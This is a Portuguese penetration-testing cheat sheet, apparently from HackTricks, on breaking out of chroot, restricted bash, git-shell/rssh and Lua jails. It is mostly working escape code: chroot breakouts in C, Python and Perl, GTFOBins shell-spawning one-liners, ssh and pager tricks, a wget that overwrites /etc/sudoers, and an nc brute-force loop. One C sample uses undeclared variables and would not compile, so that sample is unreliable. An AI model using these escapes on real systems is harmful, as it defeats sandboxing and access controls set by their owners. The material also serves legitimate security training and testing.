# Escaping de Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pesquise em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você pode executar qualquer binary com a propriedade "Shell"**

## Escapes de Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não foi projetado para se defender** contra adulterações intencionais feitas por **usuários** **privilegiados** (**root**). Na maioria dos sistemas, os contextos chroot não são empilhados corretamente, e programas dentro de um chroot **com privilégios suficientes podem executar um segundo chroot para escapar**.\
Normalmente, isso significa que, para escapar, você precisa ser root dentro do chroot.

> [!TIP]
> A **tool** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para explorar os seguintes cenários e escapar do `chroot`.

### Root + CWD

> [!WARNING]
> Se você é **root** dentro de um chroot, você **pode escapar** criando **outro chroot**. Isso ocorre porque 2 chroots não podem coexistir (no Linux). Portanto, se você criar uma pasta e então **criar um novo chroot** nessa nova pasta enquanto **está fora dela**, você estará agora **fora do novo chroot** e, consequentemente, estará no FS.
>
> Isso ocorre porque, normalmente, o chroot NÃO move seu diretório de trabalho para o diretório indicado. Assim, você pode criar um chroot, mas permanecer fora dele.

Normalmente, você não encontrará o binary `chroot` dentro de um chroot jail, mas **poderá compilar, fazer upload e executar** um binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Isso é semelhante ao caso anterior, mas, neste caso, o **attacker armazena um file descriptor do diretório atual** e, em seguida, **cria o chroot em uma nova pasta**. Por fim, como ele tem **acesso** a esse **FD** **fora** do chroot, ele o acessa e **escapa**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD pode ser passado por Unix Domain Sockets, então:
>
> - Criar um processo filho (fork)
> - Criar um UDS para que o processo pai e o filho possam se comunicar
> - Executar chroot no processo filho, em uma pasta diferente
> - No processo pai, criar um FD de uma pasta que esteja fora do novo chroot do processo filho
> - Passar esse FD ao processo filho usando o UDS
> - O processo filho executará chdir nesse FD e, como ele está fora do chroot, escapará do jail

### Root + Mount

> [!WARNING]
>
> - Montar o dispositivo root (/) em um diretório dentro do chroot
> - Executar chroot nesse diretório
>
> Isso é possível no Linux

### Root + /proc

> [!WARNING]
>
> - Montar procfs em um diretório dentro do chroot (caso ainda não esteja montado)
> - Procurar um pid que tenha uma entrada root/cwd diferente, como: /proc/1/root
> - Executar chroot nessa entrada

### Root(?) + Fork

> [!WARNING]
>
> - Criar um Fork (processo filho), executar chroot em uma pasta diferente e mais profunda no FS e executar CD nela
> - A partir do processo pai, mover a pasta onde o processo filho está para uma pasta anterior ao chroot do processo filho
> - Esse processo filho se encontrará fora do chroot

### ptrace

> [!WARNING]
>
> - Antigamente, os usuários podiam depurar seus próprios processos a partir de um processo do próprio usuário... mas isso não é mais possível por padrão
> - De qualquer forma, se for possível, você poderá usar ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeração

Obtenha informações sobre o jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificar PATH

Verifique se você pode modificar a variável de ambiente PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Paginadores e visualizadores de ajuda

Muitos ambientes restritos ainda deixam **paginadores** ou **visualizadores de ajuda** disponíveis. Geralmente, é mais rápido explorá-los do que tentar reconstruir `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se o `git` estiver disponível, lembre-se de que sua saída de ajuda geralmente passa por um pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners comuns do GTFOBins

Depois de descobrir quais binários estão acessíveis, teste primeiro os shell spawners óbvios:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se você só puder **injetar argumentos** em um comando permitido (em vez de executá-lo livremente), verifique também o **GTFOArgs**.

### Criar script

Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obter bash via SSH

Se você estiver acessando via ssh, muitas vezes pode solicitar ao servidor que execute um **programa diferente** em vez do shell de login restrito:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` for um dos poucos binários permitidos localmente, lembre-se de que ele também pode ser abusado como um **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Você pode sobrescrever, por exemplo, o arquivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Alguns ambientes não colocam você em um `rbash` simples, mas em **wrappers** como `git-shell`, `rssh` ou `lshell`:

- `git-shell` aceita apenas comandos Git do lado do servidor, além de tudo que estiver dentro de `~/git-shell-commands/`. Se esse diretório existir, execute `help` para enumerar as ações personalizadas permitidas. Se você puder **escrever** nele, qualquer executável colocado nesse diretório poderá ser acessado.
- `rssh` / `lshell` geralmente permitem apenas operações com `scp`, `sftp`, `rsync` ou no estilo Git. Nesses casos, concentre-se primeiro em **primitivas de escrita de arquivos**: faça upload de `authorized_keys`, de um arquivo de inicialização do shell ou de um script auxiliar para um local gravável e, em seguida, reconecte-se com `ssh -t ...`.
- Se o wrapper filtrar apenas a linha de comando, enumere os binários acessíveis e depois faça pivot novamente para **GTFOBins / GTFOArgs**.

### Outros truques

Verifique também:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**A página a seguir também pode ser interessante:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Truques sobre como escapar de Python jails na página a seguir:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Nesta página, você pode encontrar as funções globais às quais tem acesso dentro do lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval com execução de comandos:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alguns truques para **chamar funções de uma biblioteca sem usar pontos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar as funções de uma biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Observe que, sempre que você executar o one-liner anterior em um **ambiente lua diferente, a ordem das funções muda**. Portanto, se precisar executar uma função específica, você pode realizar um ataque de brute force carregando diferentes ambientes lua e chamando a primeira função da biblioteca:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obter um shell Lua interativo**: Se você estiver dentro de um shell Lua limitado, poderá obter um novo shell Lua (e, com sorte, ilimitado) chamando:
```bash
debug.debug()
```
## Referências

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
